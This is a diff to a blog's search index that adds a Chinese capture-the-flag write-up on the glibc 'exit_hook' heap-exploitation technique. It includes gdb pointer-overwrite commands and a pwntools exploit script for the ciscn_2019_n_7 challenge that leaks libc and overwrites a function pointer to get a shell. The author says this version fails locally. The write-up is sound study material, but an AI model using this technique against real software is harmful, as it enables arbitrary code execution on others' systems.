@@ -1,21 +1,95 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2023/11/02/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
+    <title></title>
+    <url>/2023/11/03/exit_hook/</url>
+    <content><![CDATA[<h1 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h1><p>除了free_hook，malloc_hook，还有一个exit_hook可以利用。特别是在高版本没有前两个hook函数之后存在getshell的新方法。</p>
+<pre><code class="c">#include&lt;stdio.h&gt;
+
+void main()
+&#123;
+        printf(&quot;bhxdn&quot;);
+        exit(0);
+&#125;
 </code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
+<p>进入exit函数之后，call了_run_exit_handlers。</p>
+<p><img src="C:\Users\17163\AppData\Roaming\Typora\typora-user-images\image-20230912144708753.png" alt="image-20230912144708753"></p>
+<p>后再_run_exit_handlers中call了 _dl_fini</p>
+<p><img src="C:\Users\17163\AppData\Roaming\Typora\typora-user-images\image-20230912144853856.png" alt="image-20230912144853856"></p>
+<p>在关键源码中</p>
+<pre><code class="c"> 1 #ifdef SHARED
+ 2   int do_audit = 0;
+ 3  again:
+ 4 #endif
+ 5   for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)
+ 6     &#123;
+ 7       /* Protect against concurrent loads and unloads.  */
+ 8       __rtld_lock_lock_recursive (GL(dl_load_lock));
+ 9 
+10       unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
+11       /* No need to do anything for empty namespaces or those used for
+12      auditing DSOs.  */
+13       if (nloaded == 0
+14 #ifdef SHARED
+15       || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit
+16 #endif
+17       )
+18     __rtld_lock_unlock_recursive (GL(dl_load_lock));
 </code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
+<p>call了 _rtld_lock_unlock_recursive和  __rtld_lock_lock_recursive两个函数，其实这两个函数都在 _rtld_global中存在，他会调用结构体中的函数，我们看看结构体</p>
+<pre><code>p _rtld_global
 </code></pre>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
+<p><img src="C:\Users\17163\AppData\Roaming\Typora\typora-user-images\image-20230912145524640.png" alt="image-20230912145524640"></p>
+<p><img src="C:\Users\17163\AppData\Roaming\Typora\typora-user-images\image-20230912145550577.png" alt="image-20230912145550577"></p>
+<p>这样，我们只要将其中一个存的内容掉换成one_gadgets，这是一种getshell的方法，继续看汇编。</p>
+<p>看下面汇编，有一个将内容存入rdi的情况，这里就是 _rtld_global._dl_load_lock.mutex.__size的地址。也就是传的参数，这样我们也可以用system(“&#x2F;bin&#x2F;sh”)来做。</p>
+<p><img src="C:\Users\17163\AppData\Roaming\Typora\typora-user-images\image-20230912150415068.png" alt="image-20230912150415068"></p>
+<pre><code>set *0x7ffff7ffdf60 = 0x7ffff7a31420
+set *0x7ffff7ffd968 = 0x7ffff7b95d88
 </code></pre>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p><img src="C:\Users\17163\AppData\Roaming\Typora\typora-user-images\image-20230912151626736.png" alt="image-20230912151626736"></p>
+<h2 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h2><p>程序逻辑很简单，然后主要就是练exit_hook</p>
+<p>add函数</p>
+<p><img src="/exit_hook/image-20230912223423620.png" alt="image-20230912223423620"></p>
+<p>edit函数<img src="/exit_hook/image-20230912223442918.png" alt="image-20230912223442918"></p>
+<p>问题就在read中，两个函数中的read都会造成溢出到content，从而造成任意写漏洞，这样我们就可以先泄露出libc（输入666），然后通过libc找到rtld_global改其中_rtld_lock_unlock_recursive为one_gadget地址即可。</p>
+<pre><code class="python">from LibcSearcher import *
+from pwn import *
+context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+elf=ELF(&#39;/home/hacker/Desktop/ciscn_2019_n_7&#39; )
+#p=remote(&quot;node4.buuoj.cn&quot;,27153)
+p=process(&#39;/home/hacker/Desktop/ciscn_2019_n_7&#39; )
+
+one_gadget_offset = 0x4f302
+p.sendafter(&quot;Your choice-&gt;&quot;,str(666))
+
+puts_offset = 526704
+p.recv()
+a = p.recv(14)
+puts = int(a,16)
+libc = puts - puts_offset
+print(&quot;libc&quot;,hex(libc))
+exit_hook_offset = 6405984
+exit_hook = libc + exit_hook_offset
+
+one_gadget = libc + one_gadget_offset
+
+p.sendafter(&quot;Your choice-&gt;&quot;,str(1))
+p.sendafter(&quot;Input string Length: &quot;,str(16))
+p.sendafter(&quot;Author name:&quot;,&#39;a&#39;*8 + p64(exit_hook))
+
+p.sendafter(&quot;Your choice-&gt;&quot;,str(2))
+p.sendafter(&quot;New Author name:&quot;,&#39;a&#39;*8 + p64(exit_hook))
+print(&quot;exit_hook&quot;,hex(exit_hook))
+print(&quot;one_gadget&quot;,hex(one_gadget))
+p.sendafter(&quot;New contents:&quot;,p64(one_gadget))
+gdb.attach(p)
+pause()
+p.sendafter(&quot;Your choice-&gt;&quot;,str(100))
+
+p.interactive()
+</code></pre>
+<p>这是one_gadget成功的脚本，但是其实是不行的，在本地我发现无法满足one_gadget的条件，所以还需要改成稳定的system(“&#x2F;bin&#x2F;sh”)</p>
 ]]></content>
   </entry>
 </search>
